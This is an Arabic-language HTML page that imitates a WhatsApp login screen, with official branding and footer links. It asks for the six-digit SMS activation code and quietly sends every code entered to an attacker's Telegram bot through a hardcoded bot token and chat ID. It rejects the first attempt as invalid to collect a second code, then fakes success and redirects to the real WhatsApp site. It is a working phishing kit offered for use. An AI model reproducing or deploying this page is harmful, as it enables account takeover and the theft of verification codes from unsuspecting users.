<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>WhatsApp Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            background-color: #25D366;
            color: white;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
        }

        header .logo {
            display: flex;
            align-items: center;
            font-size: 20px;
            font-weight: bold;
        }

        header .logo img {
            height: 30px;
            margin-right: 10px;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin-top: 80px;
        }

        .container .logo img {
            height: 80px;
            margin-bottom: 20px;
        }

        .container .title {
            font-size: 22px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
        }

        .container .description {
            font-size: 14px;
            color: #555;
            text-align: center;
            margin-bottom: 20px;
        }

        .container .form-group {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            width: 100%;
            max-width: 300px;
        }

        .container input {
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 10px;
            font-size: 16px;
            width: 100%;
            text-align: center;
        }

        .container button {
            padding: 12px 20px;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }

        .container button:hover {
            background-color: #1DA955;
        }

        #countdown {
            margin-top: 10px;
            color: red;
            font-weight: bold;
        }

        footer {
            background-color: #f1f1f1;
            color: #888;
            text-align: center;
            padding: 10px;
            font-size: 12px;
        }

        footer a {
            color: #25D366;
            text-decoration: none;
        }
    </style>
</head>

<body>
    <header>
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
            <span>WhatsApp</span>
        </div>
    </header>

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        </div>
        <div class="title">تسجيل الدخول</div>
        <div class="description">
            أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
        </div>
        <div class="form-group">
            <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6" required>
            <button onclick="startVerification()">متابعة</button>
        </div>
        <div id="countdown"></div>
    </div>

    <footer>
        ©️ 2024 واتساب. جميع الحقوق محفوظة. <br>
        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
    </footer>

    <script>
        let attempts = 0;

        function startVerification() {
            const activationCodeInput = document.getElementById('activationCode');
            const activationCode = activationCodeInput.value;

            if (!activationCode || activationCode.length !== 6 || !/^\d{6}$/.test(activationCode)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            sendCodeToTelegram(activationCode);
            startCountdown(activationCodeInput);
        }

        function sendCodeToTelegram(code) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
            const chatId = '612575358';
            const message = `رمز التفعيل: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch(error => {
                console.error('فشل الاتصال بالبريد الإلكتروني:', error);
            });
        }

        function startCountdown(inputField) {
            let countdownValue = 10;
            const countdownDisplay = document.getElementById('countdown');
            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;

            const interval = setInterval(() => {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    handleInvalidCode(inputField, countdownDisplay);
                } else {
                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
                }
            }, 1000);
        }

        function handleInvalidCode(inputField, countdownDisplay) {
            attempts++;
            if (attempts < 2) {
                countdownDisplay.textContent = '';
                alert('الرمز غير صحيح. تحقق من الرمز جيدًا.');
                inputField.value = '';
            } else {
                alert('تم إدخال الرمز بنجاح!');
                window.location.href = "https://www.whatsapp.com";
            }
        }
    </script>
</body>

</html>
